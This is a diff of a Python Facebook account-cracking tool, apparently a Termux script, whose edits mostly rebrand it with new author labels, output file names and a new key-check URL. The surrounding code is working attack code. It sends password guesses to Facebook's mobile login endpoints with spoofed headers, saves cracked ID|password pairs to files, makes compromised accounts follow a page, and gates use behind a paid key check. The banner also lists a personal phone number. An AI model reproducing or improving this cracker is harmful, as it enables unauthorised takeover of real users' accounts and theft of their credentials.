@@ -324,7 +324,7 @@ def crack(idf,pwv):
 			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,allow_redirects=False)
 			if "checkpoint" in po.cookies.get_dict().keys():
 				cp +=1
-				print( f'\r\x1b[1;91m [ K4US4R-CP ] {idf} | {pw}')
+				print( f'\r\x1b[1;91m [ KOBIR-CP ] {idf} | {pw}')
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				break
@@ -362,7 +362,7 @@ def free(idf,pwv):
 			ses.headers.update({"Host":'mbasic.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://mbasic.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":'https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&locale=id_ID&_rdr',"accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
 			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,allow_redirects=False)
 			if "checkpoint" in po.cookies.get_dict().keys():
-				rint( f'\r\x1b[1;91m [ K4US4R-CP ] {idf} | {pw}')
+				rint( f'\r\x1b[1;91m [ KOBIR-CP ] {idf} | {pw}')
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				break
@@ -372,7 +372,7 @@ def free(idf,pwv):
 				print(f'\r\x1b[1;92m [ KOBIR-OK] {idf} | {pw}')
 				wrt =('%s - %s' % (idf,pw))
 				ok.append(wrt)
-				open('/sdcard/KOBIR-OK.txt','a').write('%s\n' % wrt)
+				open('/sdcard/NAHID-OK.txt','a').write('%s\n' % wrt)
 				follow(ses,coki)
 				break
 
@@ -388,20 +388,20 @@ def follow(ses,coki):
 	ses.get(('https://mbasic.facebook.com' + str(get)), cookies={'cookie': coki}).text
 
 logo = ("""
-\x1b[1;92m  #    # ####### ######  ### ######  
-\x1b[1;92m  #   #  #     # #     #  #  #     # 
-\x1b[1;92m  #  #   #     # #     #  #  #     # 
+\x1b[1;92m   #    # ####### ######  ### ######  
+\x1b[1;92m  #   #  #     # #     #  #  #     #
+\x1b[1;92m  #  #   #     # #     #  #  #     #
 \x1b[1;92m  ###    #     # ######   #  ######  
-\x1b[1;92m  #  #   #     # #     #  #  #   #   
-\x1b[1;92m  #   #  #     # #     #  #  #    # 
+\x1b[1;92m  #  #   #     # #     #  #  #   #
+\x1b[1;92m #   #  #     # #     #  #  #    #
 \x1b[1;92m   #    # ####### ######  ### #     #
 
    \x1b[1;92m╔═════════════════════════════╗
-   \x1b[1;92m║➣TOOL NAME : { JR KOBIR }   ║
-   \x1b[1;92m║➣AUTHOR    : JR KOBIR       ║
+   \x1b[1;92m║➣TOOL NAME : { Jr Kobir }   ║
+   \x1b[1;92m║➣AUTHOR    : Jr Kobir       ║
    \x1b[1;92m║➣WHATSAPP    : 01710290284 ║
-   \x1b[1;92m║➣FACEBOOK  : Md. Jahangir Alam  ║
-   \x1b[1;92m║➣Group     : BCF71║
+   \x1b[1;92m║➣FACEBOOK  : Md. Jahangir Alam   ║
+   \x1b[1;92m║➣Group     : BCF71 ║
    \x1b[1;92m║➣WHATSAPP  : [ ERROR ]       ║
    \x1b[1;92m╚═════════════════════════════╝""")
 
@@ -851,12 +851,12 @@ class Main:
 				print("\r \033[0;92m[ KOBIR-OK] %s | %s\033[0;92m         "%(uid, pw))
 				print ("\r \033[0;92m Congrats Bro ")
 				self.ok.append("%s|%s"%(uid, pw))
-				open("2009-KOBIR-OK.txt","a").write(" %s|%s\n"%(uid, pw))
+				open("2009-NAHID-OK.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
 				print("\r \033[0;92m[ KOBIR-OK] %s | %s\033[0;92m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
-				open("2009-KOBIR-OK.txt","a").write(" %s | %s\n"%(uid, pw))
+				open("2009-NAHID-OK.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
 			else:
 				continue
@@ -1295,7 +1295,7 @@ def Subscraption():
 	key1=open('/data/data/com.termux/files/usr/bin/.mrkausar-cov', 'r').read()
 	clear()
 	print(logo)
-	r1=requests.get("https://github.com/Kobir143/kobir/blob/main/Kobir69.txt").text
+	r1=requests.get("https://github.com/Kobir143/kobir/blob/main/Kobirfair.txt").text
 	if key1 in r1:
 		os.system('clear')
 		print(logo)
@@ -1308,7 +1308,7 @@ def Subscraption():
 		os.system("clear")
 		print(logo)
 		print ("")
-		print(" \033[1;32m KOBIR Tool Paid You Need Get Approved First\033[1;37m\n")
+		print(" \033[1;32m this Tool Paid You Need Get Approved First\033[1;37m\n")
 		print ("")
 		print(" Your Key is Not Approved ")
 		print("")
